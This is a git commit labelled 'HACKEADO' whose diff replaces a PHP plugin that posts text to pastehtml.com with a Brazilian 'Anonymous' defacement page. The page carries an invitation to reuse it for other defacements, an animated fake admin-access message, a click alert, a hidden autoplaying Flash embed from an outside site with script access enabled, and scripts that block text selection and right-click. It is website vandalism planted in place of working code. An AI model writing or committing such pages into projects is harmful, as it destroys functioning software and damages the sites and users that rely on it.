7cca8a9e4ea676a0d5dda633450c59f9808bdef4
noitdoanjo <jhon_anjodocv@hotmail.com>
2013-04-16 02:50:17 -0300

    HACKEADO

--- plugins/00.pastehtml.plugin.php
+++ plugins/00.pastehtml.plugin.php
@@ -1,41 +1,133 @@
-<?php
-/*
-	Class to send text to pastehtml.com
-*/
+<!DOCTYPE HTML>
+<html>
+<!--
+Virus-Obito - Forum Anonymous Brasil - Moderador Global
+Eterno Aprendiz.
+Copie o HTML a baixo e utilize como seu defaced  -->
 
-class pastehtml{
-    
-    private $type = 'html';
-    
-    /**
-     * Sets the type of the paste
-     *
-     * @return boolean Indicates if the asignation was suscessful
-     * @param string $type html|txt|mrk
-     */
-    public function setType($type){
-        if (in_array($type, array('html', 'txt', 'mrk'))) {
-            $this->type = $type;
-            return true;
-        }else{
-            return false;
-        }
-    }
-    
-    /**
-     * Sends the text to pastehtml.com
-     *
-     * @param string $txt the text to be sent
-     */
-    public function paste($txt){
-        $ch = curl_init('http://pastehtml.com/upload/create?input_type=' . urlencode($this->type) . '&result=address');
-        
-        curl_setopt($ch, CURLOPT_HEADER, 0);
-        curl_setopt($ch, CURLOPT_POST, 1);
-        curl_setopt($ch, CURLOPT_POSTFIELDS, array('txt' => $txt));
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        $return = curl_exec($ch);
-        curl_close($ch);
-        return $return;
-    }
-}
+<head>
+	<title>Virus-Obito</title>  
+	<meta http-equiv="content-type" content="text/html; charset=ISO-8859-1">
+	<style type="text/css">
+		body {
+			background: #000;
+			color: #00FF00;
+			text-align: left;
+		}
+		textarea {
+			border: #0000FF;
+			resize: none;
+			background: #000;
+			color: #00ff00;
+		}
+
+
+</style>
+</head>
+
+<body onload="type_text()" onclick="alert('Defaced by KeeiSOFT')">
+
+
+<div style="display:scroll;position:fixed;bottom:0px;right:1px;">
+<embed src="http://www.powermusics.com/player-HQ.swf" allowscriptaccess="always" allowfullscreen="true" width="1" height="1" flashvars="file=http://www.powermusics.com/player.swf?file=http://youtube.com/watch?v=RfBHSSNNEmA&repeat=always&autostart=true"></embed></div></object>
+
+<script language="Javascript"><!--
+	var tl=new Array(
+"                       .....:::::~~#OpHackedSites~~:::::.....",
+"",
+"",
+"Saudações",
+"Nós somos Anonymous",
+"",
+"A verdade torna-se cada vez mais importante nos nossos dias.",
+"Por isso, torna-se cada vez mais importante que continuemos lutando por isso!",
+"",
+"",
+"                                 Página de Administração    ",
+"",
+"                             -------------------------------",
+"                             |        Login: ADMIN         |",
+"                             |     Password: ********      |",
+"                             -------------------------------",
+"                             |        ACCESS ACCEPTED      |",
+"                             -------------------------------",
+"",
+"",
+"",
+"                                             Virus-Obito",
+"                                          Eterno Aprendiz",
+"",
+"",
+"",
+"            
+						
+					); 
+	var speed=50;
+	var index=0; text_pos=0;
+	var str_length=tl[0].length;
+	var contents, row;
+
+	function type_text()
+	{
+	  contents='';
+	  row=Math.max(0,index-100);
+	  while(row<index)
+		contents += tl[row++] + '\r\n';
+	  document.forms[0].elements[0].value = contents + tl[index].substring(0,text_pos) + "_";
+	  if(text_pos++==str_length)
+	  {
+		text_pos=0;
+		index++;
+		if(index!=tl.length)
+		{
+		  str_length=tl[index].length;
+		  setTimeout("type_text()",800);
+		}
+	  } else
+		setTimeout("type_text()",speed);
+	 
+	}
+	//--></script>
+<img src="http://1.bp.blogspot.com/-mqpHT4KYYKc/TZqgI7_cG4I/AAAAAAAAAL0/Ut50peiElhY/s1600/anonlogo.jpg" align="right">
+<form><textarea rows="30" cols="80" wrap="soft" ></textarea></form>
+
+<script language="JavaScript">
+         
+        <!-- Disable
+       
+       function disableselect(e){
+       
+       return false
+       
+       }
+       
+       function reEnable(){
+       
+       return true
+       
+       }
+       
+       //if IE4+
+       
+       document.onselectstart=new Function ("return false")
+       
+       document.oncontextmenu=new Function ("return false")
+       
+       //if NS6
+       
+       if (window.sidebar){
+       
+       document.onmousedown=disableselect
+       
+       document.onclick=reEnable
+       
+       }
+       
+       //-->
+         
+        </script>
+
+
+
+</body>
+</html>
